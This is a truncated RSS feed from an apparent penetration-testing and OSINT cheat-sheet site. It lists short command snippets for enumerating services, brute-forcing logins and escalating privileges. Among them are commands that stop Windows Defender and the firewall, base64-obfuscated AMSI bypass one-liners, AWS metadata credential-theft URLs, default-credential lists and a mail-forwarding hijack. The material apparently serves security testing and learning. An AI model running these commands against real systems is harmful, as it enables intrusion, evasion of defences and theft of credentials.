      <description>Start/Stop # Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable Bypass # SigThief allow to sign a payload binary # by stealing a legit signature https://github.</description>
    </item>
    
    <item>
      <title>143 - IMAP</title>
      <link>/network/services-enumeration/143_imap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/143_imap/</guid>
      <description>Identification and Scans # Nmap scan nmap -v -sV --version-intensity=5 --script imap-capabilities -p T:143 &amp;lt;IP&amp;gt; # Banner grabbing telnet &amp;lt;IP&amp;gt; 143 # Banner grabbing and test connection nc -nv IP 143 A1 LOGIN “root” “” A1 LOGIN root toor A1 LOGIN root root </description>
    </item>
    
    <item>
      <title>Azure AD</title>
      <link>/windows-systems/privilege-escalation/azure_ad/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/azure_ad/</guid>
      <description>Exploiting Password Hash Synchronisation (PHS) https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html # The main target is the sync account # You can identify it using the description $ ldapsearch -H ldap://DC01.DOMAIN.LAN:389 -D &amp;#34;DOMAIN\user&amp;#34; -w &amp;#34;****&amp;#34; -b &amp;#34;DC=DOMAIN,DC=LAN&amp;#34; &amp;#39;(description=*Azure*)&amp;#39; description # To exploit this, need local admin or ADSync service account # Can decrypt using C:\Program Files\Microsoft Azure AD Sync\Binn\mcrypt.dll # The default configuration of Azure AD Connect uses a SQL Server Express database  # but a fully deployed SQL Server can also be used.</description>
    </item>
    
    <item>
      <title>Bug Bounty Tips</title>
      <link>/web-pentest/bug_bounty_tips/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/bug_bounty_tips/</guid>
      <description>General # This section will be mainly used to store information found on Twitter # About some bug bounty tips &amp;amp; web tricks Password Reset https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1 # 1/ Include controlled mail as a second parameter # 2/ Bruteforce reset token # 3/ Try to use a reset token on another account # 4/ Try to figure out how token are generated Payloads # Top 25 XSS Dorks https://twitter.com/trbughunters/status/1276851918946603013/photo/1 # E-mail fields are usually less sanitized or filtered # It can be a good candidate for payloads 401/403 Bypass https://twitter.</description>
    </item>
    
    <item>
      <title>Reddit</title>
      <link>/open-source-intelligence-osint/platforms-hunting/reddit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/reddit/</guid>
      <description>Basics https://www.secjuice.com/reddit-osint-techniques/
Username/Picture # Username and profile picture can help to identify cross platforms accounts # Banner too Posts # Topic is a thread where the user is the original poster (Known as OP) # Get topics for an user https://www.reddit.com/user/REPLACEWITHUSERNAME/posts/ # Pay attention to the subreddits # It can give information about interests # Comments https://www.reddit.com/user/REPLACEWITHUSERNAME/comments/ # Deleted content # You can use services like removeddit to check for deleted content # Original thread https://www.</description>
    </item>
    
    <item>
      <title>sn0int</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/sn0int/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/sn0int/</guid>
      <description>Getting Started # Documentation https://github.com/kpcyrd/sn0int https://sn0int.readthedocs.io # Registry https://sn0int.com/ # Default, no modules installed # Quick install &amp;gt; pkg quickstart &amp;gt; pkg --help # Scopes &amp;gt; workspace demo &amp;gt; add domain Domain : domain.com # Confirm &amp;gt; select domains &amp;gt; select domains where id=1 &amp;gt; select domains where value like %.com &amp;gt; select domains where ( value like e% and value like %m ) or false # Modules # Informations gathered by modules can be picked up by others &amp;gt; pkg list # Certificate transparency &amp;gt; use ctlogs &amp;gt; run # DNS &amp;gt; use dns-resolve &amp;gt; run # Scan for discovered URLs &amp;gt; use url-scan &amp;gt; target &amp;gt; target where resolvable &amp;gt; run &amp;gt; select urls Unscoping entities # Unscopping entities # Modules are greedy and add inscope things you don&amp;#39;t want # You can delete it, but it can still be picked up by other modules # Or you can set specific flags on that entity &amp;gt; target &amp;gt; noscope domains where value=google.</description>
    </item>
    
    <item>
      <title>161/162 - SNMP</title>
      <link>/network/services-enumeration/161_162_snmp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/161_162_snmp/</guid>
      <description>Resources https://blog.cedrictemple.net/239-faire-des-requetes-snmp-en-ligne-de-commande-sous-linux/ Identification &amp;amp; Scans nmap -vv -sV --version-intensity=5 -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes IP Snmpwalk snmpwalk -c public -v1 IP 1 &amp;gt; snmpwalk.txt Windows	RUNNING PROCESSES	1.3.6.1.2.1.25.4.2.1.2 Windows	INSTALLED SOFTWARE	1.3.6.1.2.1.25.6.3.1.2 Windows	SYSTEM INFO	1.3.6.1.2.1.1.1 Windows	HOSTNAME	1.3.6.1.2.1.1.5 Windows	DOMAIN	1.3.6.1.4.1.77.1.4.1 Windows	UPTIME	1.3.6.1.2.1.1.3 Windows	USERS	1.3.6.1.4.1.77.1.2.25 Windows	SHARES	1.3.6.1.4.1.77.1.2.27 Windows	DISKS	1.3.6.1.2.1.25.2.3.1.3 Windows	SERVICES	1.3.6.1.4.1.77.1.2.3.1.1 Windows	LISTENING TCP PORTS	1.3.6.1.2.1.6.13.1.3.0.0.0.0 Windows	LISTENING UDP PORTS	1.3.6.1.2.1.7.5.1.2.0.0.0.0 Linux	RUNNING PROCESSES	1.</description>
    </item>
    
    <item>
      <title>AMSI Bypass and Evasion</title>
      <link>/windows-systems/privilege-escalation/amsi_and_evasion/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/amsi_and_evasion/</guid>
      <description>Resources # AMSI Bypass Methods https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/amp/ https://www.contextis.com/us/blog/amsi-bypass https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/ # DLL Hijacking https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/ # AMSI Bypass generator https://amsi.fail/ AMSI Bypass Methods # Methods pulled from the previous mentionned resources # More details on the resources # 1. Powershell Downgrade # Older version of powershell doesn&amp;#39;t use AMIS powershell -version 2 # 2. Base64 Encoding # Original AMSI Bypass PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.AmsiUtils&amp;#39;).GetField(&amp;#39;amsiInitFailed&amp;#39;,&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true) # Base64 encoded PS&amp;gt; [Ref].Assembly.GetType(&amp;#39;System.Management.Automation.&amp;#39;+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;QQBtAHMAaQBVAHQAaQBsAHMA&amp;#39;)))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&amp;#39;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&amp;#39;))),&amp;#39;NonPublic,Static&amp;#39;).SetValue($null,$true) # 3. Hooking # The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed .</description>
    </item>
    
    <item>
      <title>MISC</title>
      <link>/web-pentest/misc_tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/misc_tricks/</guid>
      <description># Security Headers https://securityheaders.com # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox extension for security https://addons.mozilla.org/fr/firefox/addon/hacktools/ Qsreplace https://github.com/tomnomnom/qsreplace # Accept URLs on stdin, replace all query string values with a user-supplied value # only output each combination of query string parameters once per host and path. cat urls.txt | qsreplace newval https://example.com/path?one=newval&amp;amp;two=newval https://example.com/pathtwo?one=newval&amp;amp;two=newval https://example.net/a/path?one=newval&amp;amp;two=newval JSON Web Tokens (JWT) https://jwt.io/ # If RSA signed, you can try to set HS256 # You need to get the public key # By getting 2 tokens, you can calculate the public key # More info https://crypto.</description>
    </item>
    
    <item>
      <title>Photon</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/photon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/photon/</guid>
      <description>General Informations # Photon is a fast OSINT web crawler which can retrieve the following data for a target :  # URLs (in-scope &amp;amp; out-of-scope) # URLs with parameters (example.com/gallery.php?id=2) # Intel (emails, social media accounts, amazon buckets etc.) # Files (pdf, png, xml etc.) # Secret keys (auth/API keys &amp;amp; hashes) # JavaScript files &amp;amp; Endpoints present in them # Strings matching custom regex pattern # Subdomains &amp;amp; DNS related data # You can use the --ninja 4 option to get 4 clients requesting server.</description>
    </item>
    
    <item>
      <title>Tumblr</title>
      <link>/open-source-intelligence-osint/platforms-hunting/tumblr/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/tumblr/</guid>
      <description>Basics https://www.secjuice.com/tumblr-osint/ # Tumblr is an old platform (2007) and may contain old target accounts not deleted # For example, old blogs # Username will appear on the URL # As well as on multiple points userxxx.tumblr.com # User&amp;#39;s likes # The section can be disabled by the user # To find out userxx.tumblr.com/likes # Same for followers / following userxx.tumblr.com/followers userxx.tumblr.com/following userxx.tumblr.com/Followers userxx.tumblr.com/FOLLOWERS # Archives # User&amp;#39;s posts, media, reblog, text.</description>
    </item>
    
    <item>
      <title>389/636/3269 - LDAP</title>
      <link>/network/services-enumeration/389_636_3269_ldap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/389_636_3269_ldap/</guid>
      <description>General Informations # Ports 389 - LDAP 636 - LDAPS (SSL) 3269 - LDAP Global Catalog # Architecture (LDAP is hierarchical) - DC = Domain Component, the domain name - OU = Organizational Unit, \&amp;#34;folders - CN = Common Name, the name fiven to the objects (Username, Group name, Computer name, etc.) # Research syntax ldapsearch &amp;lt;bind options&amp;gt; -b &amp;lt;base to search from&amp;gt; &amp;lt;search filter&amp;gt; &amp;lt;attributes&amp;gt; # Interesting attributes for user class ldapsearch “(objectClass=user)” interesting attributes: - sAMAccountName - userPrincipalName - memberOf (groups) - badPwdCount (failed logins) - lastLogoff (timestamp) - lastLogon (timestamp) - pwdLastSet (timestamp) - logonCount # Interesting attributes for group class ldapsearch “(objectClass=group)” interesting attributes: - cn - member (one per user/group) - memberOf (if nested in another group) # Interesting attributes for computer class ldapsearch “(objectClass=computer)” interesting attributes: - name (NetBIOS name) - DNSHostName (FQDN) =&amp;gt; combine it with DNS lookups and you can enumerate every IP address in the domain without scanning - operatingSystem - operatingSystemVersion (patch level) - lastLogonTimestamp - servicePrincipalName (running services =&amp;gt; TERMSRV, HTTP, MSSQL) Facing Active Directory # Research ldapsearch -LLL -x -H ldap://pdc01.</description>
    </item>
    
    <item>
      <title>Amazon &amp; Digital Ocean Buckets</title>
      <link>/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/</guid>
      <description>Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it AWS Bucket access (SSRF for example) # You can get informations and secret about an S3 bucket # Credentials, main goal http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ # You might need the zone http://169.254.169.254/latest/dynamic/instance-identity/document # Then set  # AWS_ACCESS_KEY_ID # AWS_SECRET_ACCESS_KEY # AWS_DEFAULT_REGION # AWS_SESSION_TOKEN Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.</description>
    </item>
    
    <item>
      <title>Spooler Service</title>
      <link>/windows-systems/privilege-escalation/spoolerservice/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/spoolerservice/</guid>
      <description>WIP Finding Spooler Services # https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse # Finding Windows Servers on the domain Get-ADComputer -Filter {(OperatingSystem -like &amp;#34;*windows*server*&amp;#34;) -and (OperatingSystem -notlike &amp;#34;2016&amp;#34;) -and (Enabled -eq &amp;#34;True&amp;#34;)} -Properties * | select Name | ft -HideTableHeaders &amp;gt; servers.txt # Finding Spooler services listening  # https://github.com/NotMedic/NetNTLMtoSilverTicket .\Get-SpoolStatus.ps1 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server} # Or on Linux rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN MS-RPRN Abuse (Printer Bug) https://www.thehacker.recipes/active-directory-domain-services/movement/mitm-and-coerced-authentications/ms-rprn # Ask the service to authenticate against an arbitrary host # Using SpoolSample (https://github.</description>
    </item>
    
    <item>
      <title>995 - POP3S</title>
      <link>/network/services-enumeration/995_pop3s/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/995_pop3s/</guid>
      <description>Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION)	 nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:995 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:995 IP SSL Checking # Using openssl openssl s_client -connect IP:995 Authentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor </description>
    </item>
    
    <item>
      <title>Parler</title>
      <link>/open-source-intelligence-osint/platforms-hunting/parler/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/parler/</guid>
      <description>Resources https://www.skopenow.com/news/the-new-digital-meeting-place-what-parler-means-for-osint-investigators Tips &amp;amp; Tricks # You can use dorks without account to find content site:parler.com site:parler.com/post/ site:parler.com/profile/ site:parler.com/profile/{username} </description>
    </item>
    
    <item>
      <title>Specific Domain Groups</title>
      <link>/windows-systems/privilege-escalation/specific_domain_groups/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/specific_domain_groups/</guid>
      <description>Backup Operator / SeBackupPrivilege https://github.com/mpgn/BackupOperatorToDA # If you compromise an account member of the group Backup Operators  # you can become the Domain Admin without RDP or WinRM on the Domain Controller. # With this POC you don&amp;#39;t need to have an access with WinRM or RPD : .\BackupOperatorToDA.exe -h Backup Operator to Domain Admin (by @mpgn_x64) This tool exist thanks to @filip_dragovic / https://github.com/Wh04m1001 Mandatory argument: -t &amp;lt;TARGET&amp;gt; \\computer_name (ex: \\dc01.</description>
    </item>
    
    <item>
      <title>1025 - NFS/IIS</title>
      <link>/network/services-enumeration/1025_nfs_iis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/1025_nfs_iis/</guid>
      <description>Identification and Checking # Check on the Web port (80 ?): # _vti_pvt for OSCP /_vti_pvt/access.cnf /_vti_pvt/service.cnf /_vti_inf.htm WebDAV Exploitation using Metasploit # Checking WebDAV using metasploit use auxiliary/scanner/http/webdav_scanner set rhosts &amp;lt;IP&amp;gt; run # Content discovery using metasploit use auxiliary/scanner/http/webdav_website_content set rhosts &amp;lt;IP&amp;gt; run # Checking authentication using metasploit use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass set rhosts &amp;lt;IP&amp;gt; run # Upload exploitation using metasploit use exploit/windows/iis/iis_webdav_upload_asp Manual WebDAV exploitation (cadaver) cadaver http://IP/ # Goal is to upload file on IIS Server.</description>
    </item>
    
    <item>
      <title>1433 - MSSQL</title>
      <link>/network/services-enumeration/1433_mssql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/1433_mssql/</guid>
      <description>Identification and Scans # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -sT -Pn -p T:1433 --script=xxxx &amp;lt;IP&amp;gt; # Bruteforce accounts and password against a MSSQL Server ms-sql-brute # Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,and configuration settings. # Credentials required ms-sql-config # Queries the Microsoft SQL Browser service for the DAC (Dedicated AdminConnection) ms-sql-dac # Dumps the password hashes from an MS-SQL server in a format suitable # Credentials required ms-sql-dump-hashes # Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account.</description>
    </item>
    
    <item>
      <title>1721/500 - VPN</title>
      <link>/network/services-enumeration/1721_500_vpn/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/1721_500_vpn/</guid>
      <description>Resources https://github.com/0x90/vpn-arsenal https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/ http://devloop.users.sourceforge.net/index.php?article108/solution-du-ctf-hacklab-vulnvpn https://resources.infosecinstitute.com/vulnvpn/#gref https://0xrick.github.io/hack-the-box/conceal/#ike-scan-Setting-up-The-Connection Exploitation Techniques # IKEv2 Authenthication IP spoofing  ike-scan --sport=1723 --dport=1723 --sourceip=IP_To_Spoof --ikev2 &amp;lt;IP&amp;gt; # Trying all authentication modes ike-scan --dport=1723 --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --auth=64221 &amp;lt;IP&amp;gt; # IP spoofing using ike-scan ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=64221 &amp;lt;IP&amp;gt; # IP spoofing and agressive mode ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 &amp;lt;IP&amp;gt; # Show fingerprint ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 --showbackoff &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 --showbackoff &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 --showbackoff &amp;lt;IP&amp;gt; # Crack the key using psk-crack psk-crack hash-file.</description>
    </item>
    
    <item>
      <title>3306 - MySQL</title>
      <link>/network/services-enumeration/3306_mysql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/3306_mysql/</guid>
      <description>Basics # Try connection from outside mysql --host &amp;lt;IP&amp;gt; -u root -proot # Connection from the target machine mysql -u root -p root database Classical commands show databases; use database_name; show tables; describe table_name; select host, user, password from mysql.user; Identification and Scan # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -Pn -p T:3306 --script=xxxx &amp;lt;IP&amp;gt; # Audits MySQL database server security configuration mysql-audit # Bruteforce accounts and password against a MySQL Server mysql-brute # Attempts to list all databases on a MySQL server.</description>
    </item>
    
    <item>
      <title>3389 - RDP</title>
      <link>/network/services-enumeration/3389_rdp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/3389_rdp/</guid>
      <description>Identification and Scans # Using nmap NSE scripts nmap -Pn -sV --version-intensity=5 -p T:3389 --script=xxxx &amp;lt;IP&amp;gt; # Determines which Security layer and Encryption level is supported by the RDP service rdp-enum-encryption # Checks if a machine is vulnerable to MS12-020 RDP vulnerability rdp-vuln-ms12-020.nse Credentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwords.txt rdp://IP # Using ncrack for several users ncrack -vv -U users.txt -P passwords.txt rdp://IP Connexion # Using rdesktop rdesktop -u &amp;#34;username&amp;#34; -p &amp;#34;password&amp;#34; -g 80% -r disk:share=/path/to/share/with/remote/host &amp;lt;IP&amp;gt; # Remmina is cool too </description>
    </item>
    
    <item>
      <title>4555 - RSIP</title>
      <link>/network/services-enumeration/4555_rsip/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/4555_rsip/</guid>
      <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax haaxpass # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.local </description>
    </item>
    
  </channel>
</rss>
